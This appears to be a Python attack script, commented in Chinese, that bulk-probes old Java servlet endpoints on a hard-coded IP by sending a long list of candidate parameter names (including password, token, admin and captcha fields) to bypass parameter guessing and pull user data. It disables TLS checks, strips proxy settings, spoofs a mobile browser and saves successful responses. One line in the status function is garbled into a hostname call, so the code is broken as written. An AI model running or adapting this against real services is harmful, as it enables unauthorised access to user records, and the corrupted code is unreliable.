# -*- coding: utf-8 -*-
"""参数钥匙串 —— 批量命中老 Java servlet 的数据分支
原理：老 servlet 里大量 Integer.parseInt(getParameter(...))，缺参即 NumberFormatException 且响应字节恒定。
      一次性带上全部候选参数（各 =1）即可绕过整个"猜参数名"过程。
用法：python param_keychain.py <endpoint> [params.txt]
"""
import sys, re, socket, ssl, os, time
for _k in ("http_proxy","https_proxy","all_proxy","HTTP_PROXY","HTTPS_PROXY","ALL_PROXY"):
    os.environ.pop(_k, None)
try: sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception: pass

IP, PORT, SNI_HOST = "203.0.113.57", 443, "203.0.113.57"
UA = ("Mozilla/5.0 (Linux; Android 13; 23013RK75C) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.30 Mobile Safari/537.36")

# 候选参数名（把 params.txt 的内容并进来，或直接改这里）
PARAM_KEY = """
userid userId uid id user ids cid fid tid gid pid rid did oid sid mid aid bid
type t kind k cat category class classid typeid indexidx page p pageindex pageNo pageno
num n count c size limit start offset begin end area region site sn code no order seq sort mark tag
state status level lv name username user_name account nick nickname phone tel mobile mobilephone email
key token sign ts time timestamp nonce reqid requestid version ver flag mode action op method form cmd do
what func function group gname groupid role auth admin start_time end_time begindate enddate date day
money amount coin gold balance score point kid vid wid xid yid zid row rows len length total max min
db database table tbl sql query q s str text content body data json path dir folder file filename
up upid picid imgid fileid type_id class_id user_id userid_
leixing fenlei fenleiid leibie biao zhuangtai yonghu yonghuid huiyuan huiyuanid
zhanghao mima shouji youxiang riqi shijian jieguo shuliang tiaojian liebiao
xiangqing neirong tupian tupianid ziliao ziliaoid wenzhang wenzhangid
pinglun pinglunid liuyan kaijiang qihao qi kaijiangqi bannerid adid msgid chatid
lx lb zt yh yhid hy hyid sj sjh dh qq wx weixin fenshu jifen dengji vip qishu qs
zuozhe author mainbody headurl head_url img imgurl url src link
passwd password pwd smsCode yzm captcha appid appkey mchid openid deviceId imei
""".split()
PARAM_KEY = list(dict.fromkeys(PARAM_KEY))
QS = "&".join("%s=1" % n for n in PARAM_KEY)


def raw(method="GET", path="/", body=None, headers=None, timeout=25):
    hdr = {"Host": SNI_HOST, "User-Agent": UA, "Accept": "*/*",
           "Accept-Encoding": "identity", "Connection": "close"}
    if headers: hdr.update(headers)
    data = b""
    if body is not None:
        data = body.encode("utf-8") if isinstance(body, str) else body
        hdr.setdefault("Content-Type", "application/x-www-form-urlencoded")
        hdr["Content-Length"] = str(len(data))
    head = ("%s %s HTTP/1.1\r\n" % (method, path)
            + "".join("%s: %s\r\n" % (k, v) for k, v in hdr.items()) + "\r\n")
    s = socket.socket(); s.settimeout(timeout); s.connect((IP, PORT))
    if PORT in (443, 8443):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        try: ctx.set_ciphers("DEFAULT@SECLEVEL=1")
        except Exception: pass
        s = ctx.wrap_socket(s, server_hostname=SNI_HOST)
    s.sendall(head.encode("utf-8", "replace") + data)
    buf = b""
    while True:
        try: c = s.recv(4096)
        except socket.timeout: break
        if not c: break
        buf += c
    s.close()
    return buf.decode("utf-8", "replace")


def NFE(t):  return "NumberFormatException" in t


def status(t):
    m = re.match(r"HTTP/\d\.\d (\d+)", t)
    return int(target22.example.com(1)) if m else None


def try_ep(ep):
    """无参 → 钥匙串，GET 与 POST 都试"""
    for meth in ("GET", "POST"):
        for tag, path, body in [("无参", ep, None), ("钥匙串", ep + "?" + QS, None)]:
            t = raw(meth, path, body)
            st, nf = status(t), NFE(t)
            hit = (st == 200 and len(t) > 200 and not nf)
            print("  %-44s %-5s %-8s st=%-5s len=%-7d NFE=%-5s %s"
                  % (ep, meth, tag, st, len(t), nf, "<<< 命中" if hit else ""), flush=True)
            if hit:
                open("hit_%s_%s.txt" % (ep.strip("/").replace("/", "_"), meth), "w",
                     encoding="utf-8").write(t)
            time.sleep(1.0)


if __name__ == "__main__":
    eps = sys.argv[1:] or [
        "/LHService/get_GSB", "/LHService/peizhi", "/LHService/userinfo",
        "/LHService/userlist", "/LHService/ZiLiao", "/LHService/ZiLiaoBody",
    ]
    print("候选参数 %d 个" % len(PARAM_KEY))
    for ep in eps:
        try_ep(ep)
